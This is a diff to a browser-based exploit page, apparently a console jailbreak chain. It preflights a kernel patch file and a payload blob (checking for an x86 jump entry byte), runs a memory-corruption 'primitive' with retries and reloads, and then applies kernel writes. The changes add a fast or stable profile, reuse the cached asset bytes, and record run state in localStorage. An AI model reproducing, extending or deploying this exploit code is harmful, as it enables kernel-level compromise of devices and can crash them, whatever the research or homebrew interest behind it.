@@ -11,6 +11,8 @@ let passCount = 0,
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 const TELEMETRY = params.get("telemetry") === "1";
+const PROFILE = params.get("profile") === "fast" ? "fast" : "stable";
+const RUN_STATE_KEY = "polpNO:run-state";
 
 function post(tag, detail) {
   if (!TELEMETRY) return;
@@ -226,19 +228,22 @@ let allDone = false,
     const preflightAsset = async (name, predicate) => {
       try {
         const response = await fetch(name, { cache: "force-cache" });
-        if (!response.ok) return { ok: false, detail: "HTTP " + response.status };
+        if (!response.ok)
+          return { ok: false, detail: "HTTP " + response.status, bytes: null };
         const bytes = new Uint8Array(await response.arrayBuffer());
-        return { ok: predicate(bytes), detail: "bytes=" + bytes.length };
+        return { ok: predicate(bytes), detail: "bytes=" + bytes.length, bytes };
       } catch (e) {
-        return { ok: false, detail: (e && e.message) || String(e) };
+        return { ok: false, detail: (e && e.message) || String(e), bytes: null };
       }
     };
-    const patchAsset = DO_PATCH
-      ? await preflightAsset(KPATCH_FILE, (b) => b.length >= 32)
-      : { ok: true, detail: "disabled" };
-    const payloadAsset = DO_PAYLOAD
-      ? await preflightAsset(PAYLOAD_FILE, (b) => b.length >= 32 && b[0] === 0xe9)
-      : { ok: true, detail: "disabled" };
+    const [patchAsset, payloadAsset] = await Promise.all([
+      DO_PATCH
+        ? preflightAsset(KPATCH_FILE, (b) => b.length >= 32)
+        : Promise.resolve({ ok: true, detail: "disabled", bytes: null }),
+      DO_PAYLOAD
+        ? preflightAsset(PAYLOAD_FILE, (b) => b.length >= 32 && b[0] === 0xe9)
+        : Promise.resolve({ ok: true, detail: "disabled", bytes: null }),
+    ]);
     if (!check("preflight-kpatch", patchAsset.ok, patchAsset.detail)) {
       state("refused before kernel stage", "bad");
       mark("SAFE-ABORT", "kpatch asset missing, short, or not cached");
@@ -249,7 +254,10 @@ let allDone = false,
       mark("SAFE-ABORT", "payload missing, short, or invalid entry byte");
       return;
     }
-    mark("PREFLIGHT-OK", "no kernel writes have started");
+    try {
+      localStorage.setItem(RUN_STATE_KEY, "active");
+    } catch (eState) {}
+    mark("PREFLIGHT-OK", "no kernel writes have started profile=" + PROFILE);
     mark("FW-STATUS", off.fw_status || "none");
     mark(
       "FW-KTABLE",
@@ -276,7 +284,13 @@ let allDone = false,
     // A hard KP (a total reclaim miss that faults inside the cancel walk)
     // cannot be caught here and still needs a reboot -- this only recovers
     // the benign, detectable misses.
-    const RETRY_MAX = clampInt(params.get("retry"), 8, 0, 32);
+    const RETRY_MAX = clampInt(
+      params.get("retry"),
+      PROFILE === "fast" ? 4 : 8,
+      0,
+      32,
+    );
+    const RETRY_DELAY = PROFILE === "fast" ? 400 : 750;
     const RETRY_KEY = "jb1352-read-retry";
     const retryCount = () => {
       try {
@@ -316,7 +330,7 @@ let allDone = false,
         try {
           location.reload();
         } catch (e) {}
-      }, 400);
+      }, RETRY_DELAY);
       return true;
     };
     if (retryCount() > 0)
@@ -327,7 +341,12 @@ let allDone = false,
 
     state("running the primitive...", "warn");
     await new Promise((r) => setTimeout(r, 0));
-    const primitiveAttempts = clampInt(params.get("attempts"), 8, 4, 12);
+    const primitiveAttempts = clampInt(
+      params.get("attempts"),
+      PROFILE === "fast" ? 6 : 8,
+      4,
+      12,
+    );
 
     const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
     const carrier = await establishPrimitive({
@@ -2587,12 +2606,7 @@ let allDone = false,
               payloadBlob = null;
             const SITES = [];
             if (DO_PATCH) {
-              try {
-                const r = await fetch(KPATCH_FILE);
-                if (r.ok) kpatchBlob = new Uint8Array(await r.arrayBuffer());
-              } catch (e) {
-                mark("KPATCH-FETCH-THREW", (e && e.message) || String(e));
-              }
+              kpatchBlob = patchAsset.bytes;
               if (kpatchBlob)
                 for (let i = 0; i + 7 <= kpatchBlob.length; i++) {
                   if (kpatchBlob[i] !== 0xc6 || kpatchBlob[i + 1] !== 0x81)
@@ -2617,12 +2631,7 @@ let allDone = false,
               );
             }
             if (DO_PAYLOAD) {
-              try {
-                const r = await fetch(PAYLOAD_FILE);
-                if (r.ok) payloadBlob = new Uint8Array(await r.arrayBuffer());
-              } catch (e) {
-                mark("PAYLOAD-FETCH-THREW", (e && e.message) || String(e));
-              }
+              payloadBlob = payloadAsset.bytes;
               mark(
                 "PAYLOAD-BLOB",
                 "file=" +
@@ -3386,6 +3395,9 @@ let allDone = false,
     try {
       if (typeof A !== "undefined" && A) A.busy = 0;
     } catch (e) {}
+    try {
+      localStorage.setItem(RUN_STATE_KEY, "idle");
+    } catch (eState) {}
     mark(
       "PROOF-SUMMARY-FINAL",
       "pass=" +
